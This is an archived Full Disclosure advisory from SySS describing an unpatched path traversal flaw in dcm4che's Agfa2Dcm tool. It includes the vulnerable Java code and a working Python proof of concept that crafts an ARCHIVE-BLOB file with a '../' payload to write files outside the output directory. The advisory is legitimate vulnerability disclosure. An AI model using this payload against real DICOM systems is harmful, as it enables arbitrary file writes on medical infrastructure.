---
title: [SYSS-2026-079]: dcm4che - Path Traversal (CWE-22)
url: https://seclists.org/fulldisclosure/2026/Oct/24
source: Full Disclosure
date: 2026-10-15
fetch_date: 2026-10-16T06:37:49.689164
---

# [SYSS-2026-079]: dcm4che - Path Traversal (CWE-22)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](23)
[By Date](date.html#24)
[![Next](/images/right-icon-16x16.png)](25)

[![Previous](/images/left-icon-16x16.png)](23)
[By Thread](index.html#24)
[![Next](/images/right-icon-16x16.png)](25)

![](/shared/images/nst-icons.svg#search)

# [SYSS-2026-079]: dcm4che - Path Traversal (CWE-22)

---

*From*: Matthias Deeg via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Thu, 15 Oct 2026 09:32:08 +0200

---

```
Advisory ID:               SYSS-2026-079
Product:                   dcm4che
Manufacturer:              J4Care
Affected Version(s):       5.35.0
Tested Version(s):         5.35.0
```

Vulnerability Type: Improper Limitation of a Pathname to a
Restricted Directory ('Path Traversal') (CWE-22)

```
Risk Level:                High
Solution Status:           Open
Manufacturer Notification: 2026-08-06
Public Disclosure:         2026-10-13
CVE Reference:             Not yet assigned
Author of Advisory:        Matthias Deeg, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:
```

dcm4che is a Java-based Digital Imaging and Communications in Medicine
(DICOM)
toolkit providing libraries and command-line utilities for processing,
storing,

```
and transmitting DICOM data (see [1]).

The Agfa2Dcm command-line tool in dcm4che is vulnerable to a path traversal
attack. An attacker who can supply an Agfa ARCHIVE-BLOB DICOM file for
processing with Agfa2Dcm can write extracted data outside the configured
output directory by injecting "../" sequences into DICOM attribute values.

This allows attackers to achieve arbitrary file write on the target system.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

The Agfa2Dcm tool processes Agfa ARCHIVE-BLOB DICOM files by extracting
embedded file entries. Each entry's output path is constructed using
AttributesFormat.format(), which substitutes DICOM attribute values into a
configurable filename pattern (see Agfa2Dcm.java:140):

  list.add(part = new Part(format.format(attrs),
          dis.getPosition() + headerLength));

The default format pattern is {00080018} (SOPInstanceUID). The formatted
result is used directly as a file path component when extracting the
embedded data (Agfa2Dcm.java:146-149):

  Path outPath = Paths.get(outDir, part.path);
  Files.createDirectories(outPath.getParent());
  try (OutputStream out = Files.newOutputStream(outPath)) {
      StreamUtils.copy(in, out, part.length, buffer);
  }

No path validation is performed. If a DICOM attribute value contains
"../" sequences, the resulting path escapes the configured output
directory.

A crafted ARCHIVE-BLOB file can be created by encoding the file
padding (16384 bytes of zeros), the "ARCHIVE-BLOB" header (12 bytes),
and DICOM data elements including a (0008,0018) SOPInstanceUID element
with a path traversal payload as its value. The agfa2dcm binary processes
such a file without error, writing the extracted data outside the intended
directory.

The root cause is the missing validation of format.format() output before
its use in file path operations.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

The path traversal can be demonstrated by creating an ARCHIVE-BLOB file
with a path traversal payload in the SOPInstanceUID field, for example,
using the following Python script.

The output directory for agfa2dcm (in this example "/tmp/output") has to
exist.

cat > poc.py << 'EOF'
#!/usr/bin/env python3
import struct, subprocess, os

TRAVERSAL = "../outside_agfa2dcm"

# Build DICOM element: (0008,0018) VR=UI value=../outside_agfa2dcm
val = TRAVERSAL.encode('ascii')
```

elem = struct.pack('<HH', 0x0008, 0x0018) + b'UI' + struct.pack('<H',
len(val)) + val

```
# ARCHIVE-BLOB file: 16384 zeros + header + DICOM element
with open("malicious.blob", "wb") as f:
  f.write(b'\x00' * 16384)
  f.write(b"ARCHIVE-BLOB")
  f.write(elem)

# Run agfa2dcm
# agfa2dcm -d /tmp/output malicious.blob

# Verify: file written at /tmp/outside_agfa2dcm (outside /tmp/output)
EOF

The file is written to /tmp/outside_agfa2dcm, one directory level above the
configured output directory, confirming the path traversal.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

SySS GmbH is not aware of a security update for the described issue.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclosure Timeline:

2026-08-06: Vulnerability reported to manufacturer
2026-09-04: Vulnerability reported to manufacturer again
2026-10-13: Public release of security advisory

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

References:

[1] dcm4che project website
    https://www.dcm4che.org/
[2] SySS Security Advisory SYSS-2026-079
```

<https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2026-079.txt>

```
[3] SySS GmbH, SySS Responsible Disclosure Policy
    https://www.syss.de/en/responsible-disclosure-policy

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Credits:

This security vulnerability was found by Matthias Deeg of SySS GmbH with
the assistance of SySS AI.

E-Mail: matthias.deeg (at) syss.de
```

Public Key:
<https://www.syss.de/fileadmin/dokumente/PGPKeys/Matthias_Deeg.asc>

```
Key fingerprint = D1F0 A035 F06C E675 CDB9 0514 D9A4 BF6A 34AD 4DAB

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclaimer:

The information provided in this security advisory is provided "as is"
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS
website.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Copyright:

Creative Commons - Attribution (by) - Version 4.0
URL: https://creativecommons.org/licenses/by/4.0/deed.en
```

**Attachment:
[OpenPGP\_signature.asc](att-24/OpenPGP_signature_asc.bin)**
*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](23)
[By Date](date.html#24)
[![Next](/images/right-icon-16x16.png)](25)

[![Previous](/images/left-icon-16x16.png)](23)
[By Thread](index.html#24)
[![Next](/images/right-icon-16x16.png)](25)

### Current thread:

* **[SYSS-2026-079]: dcm4che - Path Traversal (CWE-22)** *Matthias Deeg via Fulldisclosure (Oct 15)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://se...